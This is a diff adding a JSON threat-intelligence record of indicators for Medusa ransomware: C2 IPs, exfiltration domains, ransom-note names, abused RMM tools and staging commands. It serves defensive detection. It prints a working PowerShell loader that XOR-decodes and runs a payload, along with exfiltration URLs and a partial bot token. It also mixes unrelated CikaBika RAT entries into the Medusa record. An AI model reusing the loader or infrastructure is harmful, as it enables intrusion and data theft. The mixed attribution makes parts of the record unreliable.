@@ -1,0 +1,492 @@
+{
+  "malware_family": "Medusa Ransomware (Medusa RaaS)",
+  "threat_actor": "Storm-1175 (aka Spearwing); Medusa RaaS affiliates",
+  "platforms": [
+    "windows"
+  ],
+  "summary": "Medusa is a Ransomware-as-a-Service operation whose affiliates gain initial access through exploited internet-facing systems (GoAnywhere MFT, SimpleHelp, ScreenConnect, Exchange ProxyShell, Fortinet EMS) and then abuse legitimate RMM tools such as SimpleHelp, Atera and PDQ Deploy for C2, persistence and lateral movement. Encryption appends the .MEDUSA extension and drops !!!READ_ME_MEDUSA!!!.txt, while data is staged with Robocopy/Rclone and exfiltrated to endpoints such as erp.ranasons.com over ports 443/445/80. Detection should focus on unusual JWrapper/SimpleHelp agent connections, PDQ Deploy service execution of AdminArsenal payloads like gaze.exe, and large uploads to rare external hosts.",
+  "mitre_techniques": [
+    "T1190",
+    "T1219",
+    "T1486",
+    "T1021.001",
+    "T1021.003",
+    "T1570",
+    "T1105",
+    "T1041",
+    "T1048",
+    "T1567.002",
+    "T1078",
+    "T1110",
+    "T1550.002",
+    "T1039",
+    "T1074",
+    "T1119",
+    "T1020"
+  ],
+  "host_artifacts": [
+    {
+      "kind": "other",
+      "value": ".MEDUSA",
+      "context": "Extension appended to Medusa-encrypted files",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "!!!READ_ME_MEDUSA!!!.txt",
+      "context": "Ransom note dropped on compromised systems",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "gaze.exe",
+      "context": "Medusa ransomware binary observed on network devices",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "c:\\windows\\system32\\gaze.exe",
+      "context": "Ransomware binary executed directly on victim host, Sept/Oct 2025 intrusion",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "<device_hostname>\\ADMIN$ file=AdminArsenal\\PDQDeployRunner\\service-1\\exec\\gaze.exe",
+      "context": "Ransomware binary pushed via PDQ Deploy administrative share",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "share=\\\\<device_hostname>\\ADMIN$ file=AdminArsenal\\PDQDeployRunner\\service-1\\exec\\[0-9a-b]{4}.exe",
+      "context": "PDQ Deploy Runner executable delivering BYOVD tooling per CrowdStrike alert",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "c:\\windows\\[0-9a-b]{4}.exe",
+      "context": "Suspicious driver dropped for BYOVD/AV termination",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\ProgramData\\JWrapper-Remote Access\\JWrapper-Remote Access Bundle-[0-9]{11}\\JWrapperTemp-[0-9]{10}-[0-9]{1}-app\\bin\\windowslauncher.exe",
+      "context": "JWrapper remote access launcher executed by compromised user account",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "Temp\\[a-z]{2}.exe",
+      "context": "RMM-linked executable written over SMB to another device",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Users\\<compromised_user>\\Documents\\[a-z]{2}.exe",
+      "context": "RMM application executable path from CrowdStrike alert",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "robocopy . \"c:\\windows\\\\\" /COPY:DT /E /XX /R:0 /W:0 /NP /XF RunFileCopy.cmd /IS /IT",
+      "context": "Staging command on Windows servers; parent process not stated",
+      "specificity": "medium",
+      "evidence": "runtime_only",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "SimpleHelp",
+      "context": "RMM abused for C2, persistence, lateral movement, exfiltration",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "Atera",
+      "context": "Legitimate RMM abused by Medusa actors",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "ScreenConnect",
+      "context": "RMM abused by Medusa; also CVE-2024-1709 initial access",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "PDQ Deploy",
+      "context": "Software deployment tool used to push payloads and ransomware binary",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "MeshAgent",
+      "context": "Legitimate remote access tool abused by Medusa actors",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "AnyDesk",
+      "context": "Legitimate remote access tool abused by Medusa actors",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "TeamViewer",
+      "context": "Legitimate remote access tool abused by Medusa actors",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "Splashtop",
+      "context": "Legitimate remote access tool abused by Medusa actors",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "process_name",
+      "value": "Rclone",
+      "context": "Used by Medusa for data exfiltration",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "rclone",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "AbyssWorker",
+      "context": "BYOVD tool used alongside KillAV to terminate antivirus processes",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "-WindowStyle Hidden Start-Process 'Presentation_Generale.pdf.pdf' -WindowStyle Minimized;$data=[IO.File]::ReadAllBytes('Presentation_Generale.pdf.pdf');$key=$data[239];$file=$env:TEMP+'\\IfyuUapz.txt';$xdata = ($data[144305..5726256] | ForEach-Object { $_ -bxor $key });[IO.File]::WriteAllBytes($file, $xdata);cmd /c $file",
+      "context": "CikaBika RAT: PowerShell embedded in malicious LNK, decoy PDF displayed",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "%TEMP%\\IfyuUapz.txt",
+      "context": "CikaBika RAT: XOR-decoded Nim loader written to TEMP and run via cmd /c",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\dbghelp.dll",
+      "context": "CikaBika RAT: Rust DLL planted in Edge directory for DLL sideloading",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "C:\\Windows\\Temp\\dbghelp.tmp",
+      "context": "CikaBika RAT: DLL staged before UAC-bypass move into Edge directory",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "registry_key",
+      "value": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command",
+      "context": "CikaBika RAT: hijacked UAC bypass key triggered via computerdefaults.exe",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "MTQzMjcyMjA4Mzk5NzAyODUxMg.GJpNS2.CE19P",
+      "context": "CikaBika RAT: Discord bot token in RAT configuration",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Available commands: !shell, !src, !info, !download, !upload, !sysinfo, !stream, !camera, !broadcast, !isOn",
+      "context": "CikaBika RAT: Discord command set printed in device channel",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "ip",
+      "value": "185.108.129.62",
+      "context": "Malicious SimpleHelp C2 server observed during Medusa attacks",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.126.238.119",
+      "context": "Malicious SimpleHelp C2 server observed during Medusa attacks",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "213.183.63.41",
+      "context": "Malicious SimpleHelp C2 server, Nov 2024 - Sep 2025",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "213.183.63.42",
+      "context": "Malicious SimpleHelp C2 server observed during Medusa attacks",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "31.220.45.120",
+      "context": "Malicious SimpleHelp C2 server, Sep-Oct 2025 intrusion",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "91.92.246.110",
+      "context": "Malicious SimpleHelp C2 server observed during Medusa attacks",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "45.9.149.112:15330",
+      "context": "Malicious SimpleHelp C2 server on non-standard port",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "89.36.161.12",
+      "context": "Malicious SimpleHelp C2 server observed during Medusa attacks",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "193.37.69.154:7070",
+      "context": "RU/Moscow IP contacted by SimpleHelp-controlled device exfiltrating data",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "erp.ranasons.com",
+      "context": "Data exfiltration destination over ports 443/445/80",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "143.110.243.154",
+      "context": "IP resolving erp.ranasons.com, exfiltration over 443",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "pruebas.pintacuario.mx",
+      "context": "Data exfiltration destination; previously hosted a SimpleHelp server",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "144.217.181.205",
+      "context": "IP resolving pruebas.pintacuario.mx exfiltration endpoint",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "lirdel.com",
+      "context": "Host of Atera-related MSI downloaded with PowerShell",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "44.235.83.125",
+      "context": "IP hosting /a.msi Atera-related file",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "44.235.83.125/a.msi",
+      "context": "Atera-related MSI downloaded with PowerShell during Medusa compromise",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "wizarr.manate.ch/108.215.180.161:8585/$/1dIL5",
+      "context": "Suspicious file observed on device during Medusa compromise",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "[0-9]{4}.filemail.com",
+      "context": "File-sharing service abused to deliver additional Medusa payloads",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "user_agent",
+      "value": "SSH-2.0-rclone",
+      "context": "SSH client banner seen in mid-2024 exfiltration to Ngrok proxy destinations",
+      "specificity": "high",
+      "evidence": "runtime_only",
+      "origin_tool": "rclone"
+    },
+    {
+      "kind": "url",
+      "value": "https://0487-105-96-75-236.ngrok-free.app/upload?filename=jdid1.zip",
+      "context": "CikaBika RAT: ngrok endpoint receiving ZIP exfiltrated via curl POST",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://discord.com/api/v10/channels/",
+      "context": "CikaBika RAT: Discord API base used for C2 messaging and file transfer",
+      "specificity": "medium",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "ipify.com",
+      "context": "CikaBika RAT: service queried for victim public IP during registration",
+      "specificity": "low",
+      "evidence": "prose",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [],
+  "file_types": [
+    "pe",
+    "script"
+  ]
+}
